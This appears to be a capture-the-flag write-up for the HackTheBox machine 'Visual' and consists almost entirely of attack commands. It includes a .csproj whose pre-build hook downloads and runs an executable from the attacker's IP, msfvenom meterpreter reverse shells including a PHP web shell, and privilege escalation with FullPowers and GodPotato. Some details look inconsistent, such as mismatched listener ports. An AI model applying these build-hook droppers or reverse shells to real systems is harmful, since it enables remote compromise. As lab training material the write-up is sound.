---
layout: post
title: HTB{Visual}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, windows]
---
<!--cut-->

* TOC
{:toc}


### USER:

```text
dotnet new sln -o Repo
cd Repoe
dotnet new console -o Repo.ConsoleApp --framework net6.0
dotnet sln Repo.sln add Repo.ConsoleApp/Repo.ConsoleApp.csproj
```

`Repo.ConsoleApp.csproj`:


```text
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

    <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
      <Exec Command="certutil -urlcache -f http://10.10.14.130:1234/asd.exe %temp%/asd.exe" />
    </Target>

    <Target Name="PostBuild" AfterTargets="PostBuildEvent">
      <Exec Command="start %temp%/asd.exe" />
    </Target>
</Project>


```
Shell:

```text

$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.130 LPORT=1235 -f exe > s.exe
$ msfconsole
msf6 > use multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lport 4244
msf6 > set lhost tun0
msf6 > run
```
Install Gitea:

```text
mkdir data
podman pull docker.io/gitea/gitea:latest
podman run --rm -it -v ./data:/data -p 3000:3000 gitea/gitea
```
```text
C:\Users\enox\Desktop>type user.txt
type user.txt
8af16def548cd6cf860ba2f3fdb12b29

```
### ROOT:


Web Shell:

```text
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.130 LPORT=12346 -f raw > dsa.php
cd C:\xampp\htdocs
curl http://10.10.11.234/dsa.php
```

Upload `FullPowers`:

```text
https://github.com/itm4n/FullPowers

```

```text
GodPotato-NET4.exe -cmd "C:\tmp\asd.exe"
```



```text
meterpreter > cat root.txt 
d8c205816a7c9dcfabfd60c0152312ae

```
